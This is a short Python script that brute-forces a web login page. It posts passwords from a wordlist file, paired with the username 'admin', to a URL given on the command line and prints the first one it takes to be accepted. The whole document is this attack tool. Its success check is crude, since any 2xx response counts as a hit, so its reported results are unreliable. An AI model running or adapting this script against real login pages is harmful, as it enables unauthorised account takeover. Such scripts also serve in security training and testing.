import requests
from termcolor import cprint, colored
import argparse

def guess_password(url):
    post_request={'username':'admin', 'password':'', 'Login':'submit'}

    cprint('    Credentials','blue')
    cprint('_____________________','blue')

    with open('files_dirs.txt', 'r') as sub_list:
        for line in sub_list:
            password = line.strip()
            post_request['password'] = password
            response = requests.post(url, data=post_request)

            if response:
                print(post_request['username'] + 
                      colored(' : ', 'green') +
                      post_request['password'])
                break

    cprint('_____________________','blue')

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("url", help="Existing url (e.g. www.google.com)")
    args = parser.parse_args()

    guess_password('http://'+args.url)
    

if __name__=='__main__':
    main()